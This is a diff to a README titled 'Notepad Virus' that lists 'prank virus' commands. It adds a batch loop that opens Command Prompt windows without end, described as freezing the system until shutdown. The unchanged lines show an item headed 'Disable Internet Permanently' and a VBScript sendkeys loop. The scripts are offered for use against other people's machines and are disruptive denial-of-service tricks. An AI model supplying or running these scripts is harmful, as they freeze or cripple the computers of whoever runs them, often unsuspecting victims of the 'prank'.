@@ -1,6 +1,6 @@
 # Notepad Virus
 
-## 🦠Top Virus Making Commands From Notepad🦠
+## 🦠Top Prank Virus Making Commands From Notepad🦠
 
 
 ### 🟣1. Disable Internet Permanently :-
@@ -69,3 +69,10 @@ wscript.sleep 100
 wshshell.sendkeys “~(enter)”
 loop
 ```
+### 🟣1. Cmd tab spam  :-
+```
+:loopstart
+start
+goto loopstart
+```
+### 🃏Action :- This opens Command Prompt tabs in a loop, freezing the system until manually shut down..
